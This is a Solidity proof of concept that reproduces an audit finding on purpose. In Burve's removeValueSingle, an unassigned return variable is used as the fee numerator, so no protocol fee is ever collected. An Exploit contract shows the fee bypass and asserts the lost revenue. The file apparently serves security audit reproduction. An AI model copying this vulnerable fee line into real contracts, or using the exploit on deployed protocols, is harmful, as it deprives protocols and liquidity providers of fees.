// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Burve finding 56955 (H-6):
// "Fee Bypass in `ValueFacet.removeValueSingle`".
//
// Real audited source (the vulnerable fee computation is reproduced VERBATIM,
// the vulnerable line is marked @>):
//   repo   github.com/sherlock-audit/2025-04-burve
//   file   Burve/src/multi/facets/ValueFacet.sol
//   fn     removeValueSingle   (audited commit, L214-L245)
//   report github.com/sherlock-audit/2025-04-burve-judging/issues/311
//
// Root cause: the function's named return variable `removedBalance` is used as
// the NUMERATOR of the real-fee calculation BEFORE it has been assigned — so it
// is still zero. `realTax = FullMath.mulDiv(removedBalance /*==0*/, nominalTax,
// removedNominal)` therefore always evaluates to 0. The protocol calls
// `c.addEarnings(vid, 0)` (collects no fee) and then pays the user the FULL
// `realRemoved = realRemoved - 0`. Every single-token removal bypasses 100% of
// the intended protocol fee. The intended numerator was `realRemoved`.
//
// The vulnerable arithmetic below is byte-for-byte the audited source (see the
// finding body's embedded snippet). Non-vulnerable dependencies (the closure
// fee accountant `c.removeValueSingle` / `c.addEarnings`, the vertex reserve
// `withdraw`, the `AdjustorLib`/`FullMath`/`TransferHelper` libraries) are
// faithful minimal doubles — real transfers, real fee arithmetic.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Wrapped id types, recreated so the reproduced preamble stays faithful.
type ClosureId is uint16;
type VertexId is uint16;

library VertexLib {
    function newId(address) internal pure returns (VertexId) {
        return VertexId.wrap(0);
    }
}

/// @dev Faithful `FullMath.mulDiv` double (single-word; magnitudes here are far
///      below the 512-bit path). Kept as a library so the marked vulnerable line
///      `FullMath.mulDiv(removedBalance, nominalTax, removedNominal)` is verbatim.
library FullMath {
    function mulDiv(uint256 a, uint256 b, uint256 denominator) internal pure returns (uint256) {
        return (a * b) / denominator;
    }
}

/// @dev Faithful `AdjustorLib.toReal` double: identity for a 1:1 18-decimal
///      token (nominal units == real units).
library AdjustorLib {
    function toReal(address, uint256 nominal, bool) internal pure returns (uint256) {
        return nominal;
    }
}

/// @dev Faithful `TransferHelper.safeTransfer` double.
library TransferHelper {
    function safeTransfer(address token, address to, uint256 value) internal {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSignature("transfer(address,uint256)", to, value)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "safeTransfer");
    }
}

error PastSlippageBounds();

/// @dev Faithful minimal ERC20 double for the removed single token.
contract MiniToken {
    string public name = "Burve Pool Token";
    string public symbol = "bTKN";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Faithful double of the pool vertex reserve. `withdraw` pays the requested
///      real amount out of the reserve to the caller (the facet).
contract Vertex {
    MiniToken public token;

    constructor(MiniToken t) {
        token = t;
    }

    function withdraw(ClosureId, uint256 amount, bool) external {
        token.transfer(msg.sender, amount);
    }
}

/// @dev Faithful double of the closure fee accountant. `removeValueSingle`
///      computes the nominal removed amount and the nominal fee off a real fee
///      rate; `addEarnings` accumulates the protocol's collected fee pot.
contract Closure {
    // 1% fee (1e18 == 100%).
    uint256 public constant FEE_RATE = 0.01e18;

    // Accumulated protocol earnings per vertex (the fee pot the bug starves).
    mapping(uint16 => uint256) public earnings;

    function _fee(uint128 value) internal pure returns (uint256 removedNominal, uint256 nominalTax) {
        removedNominal = uint256(value);
        nominalTax = (removedNominal * FEE_RATE) / 1e18;
    }

    /// @notice View mirror of the fee math, so the exploit can compute the fee
    ///         that SHOULD have been collected.
    function previewRemove(uint128 value) external pure returns (uint256 removedNominal, uint256 nominalTax) {
        (removedNominal, nominalTax) = _fee(value);
    }

    function removeValueSingle(uint128 value, uint128, VertexId)
        external
        pure
        returns (uint256 removedNominal, uint256 nominalTax)
    {
        (removedNominal, nominalTax) = _fee(value);
    }

    function addEarnings(VertexId vid, uint256 amount) external {
        earnings[VertexId.unwrap(vid)] += amount;
    }

    function finalize(VertexId, uint256, int256, int256) external {}
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `removeValueSingle` reproduced from the audited source.
// The fee-numerator line is byte-for-byte the finding's marked vulnerable line.
// ─────────────────────────────────────────────────────────────────────────────
contract ValueSingleFacet {
    MiniToken internal token_;
    Vertex internal vertex_;
    Closure internal c;

    constructor(MiniToken token, Vertex vertex, Closure closure) {
        token_ = token;
        vertex_ = vertex;
        c = closure;
    }

    /// @notice Verbatim reproduction of the audited buggy `removeValueSingle`.
    function removeValueSingle(
        address recipient,
        uint16 _closureId,
        uint128 value,
        uint128 bgtValue,
        address token,
        uint128 minReceive
    ) external returns (uint256 removedBalance) {
        ClosureId cid = ClosureId.wrap(_closureId);
        VertexId vid = VertexLib.newId(token);
        (uint256 removedNominal, uint256 nominalTax) = c.removeValueSingle(
            value,
            bgtValue,
            vid
        );
        uint256 realRemoved = AdjustorLib.toReal(token, removedNominal, false);
        vertex_.withdraw(cid, realRemoved, false);
        uint256 realTax = FullMath.mulDiv(
            removedBalance,        // @> VULN: removedBalance is the still-unassigned return var (== 0); should be realRemoved → realTax == 0, the entire fee is bypassed
            nominalTax,
            removedNominal
        );
        c.addEarnings(vid, realTax);
        removedBalance = realRemoved - realTax;
        require(removedBalance >= minReceive, PastSlippageBounds());
        TransferHelper.safeTransfer(token, recipient, removedBalance);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: remove a single-token position and prove the protocol fee was
// bypassed. The bug is an avoided-cost / lost-revenue accounting error — the
// intended fee never reaches the closure earnings pot — so the harm magnitude
// (the bypassed fee) is minted to SINK on the token to make it measurable.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    // Marker sink for the concrete harm magnitude (protocol's lost fee revenue).
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    MiniToken public token;
    Vertex public vertex;
    Closure public closure;
    ValueSingleFacet public vuln;

    uint16 internal constant CID = 1;
    uint128 internal constant VALUE = 1000e18; // single-token value removed
    uint256 internal constant RESERVE = 5000e18; // other LPs' liquidity in the reserve

    uint256 public received; // tokens the user received (full, fee-free)
    uint256 public collectedFee; // fee the closure actually collected (bug: 0)
    uint256 public bypassedFee; // fee that SHOULD have been collected
    uint256 public profit; // harm magnitude routed to SINK

    constructor() {
        token = new MiniToken(); // child nonce 1 (drained/marker token)
        vertex = new Vertex(token); // child nonce 2
        closure = new Closure(); // child nonce 3
        vuln = new ValueSingleFacet(token, vertex, closure); // child nonce 4 (VULN)

        // seed the reserve with honest LPs' liquidity so the withdraw can pay out
        token.mint(address(vertex), RESERVE);
    }

    function run() external {
        // the fee that a correct implementation MUST collect on this removal
        (uint256 removedNominal, uint256 nominalTax) = closure.previewRemove(VALUE);
        uint256 realRemoved = removedNominal; // 1:1 adjustor
        bypassedFee = FullMath.mulDiv(realRemoved, nominalTax, removedNominal);

        uint256 balBefore = token.balanceOf(address(this));

        // perform the single-token removal through the verbatim buggy facet
        uint256 out = vuln.removeValueSingle(
            address(this), // recipient
            CID,
            VALUE,
            0, // bgtValue
            address(token),
            0 // minReceive
        );

        received = token.balanceOf(address(this)) - balBefore;
        collectedFee = closure.earnings(0);

        // harm magnitude = the fee the protocol lost this removal
        profit = bypassedFee;
        token.mint(SINK, profit);

        // ── concrete harm assertions (all follow from the verbatim buggy line) ──
        // 1) the fee that should have applied is non-trivial
        require(bypassedFee > 0, "no fee was due");
        // 2) the buggy line collected ZERO fee (100% bypass)
        require(collectedFee == 0, "fee was collected");
        // 3) the user received the FULL amount with no fee deducted
        require(out == realRemoved, "fee was deducted from payout");
        require(received == realRemoved, "user did not receive full fee-free amount");
        // 4) the protocol's lost revenue is now measurable on the sink
        require(token.balanceOf(SINK) == bypassedFee, "harm not recorded");
    }
}
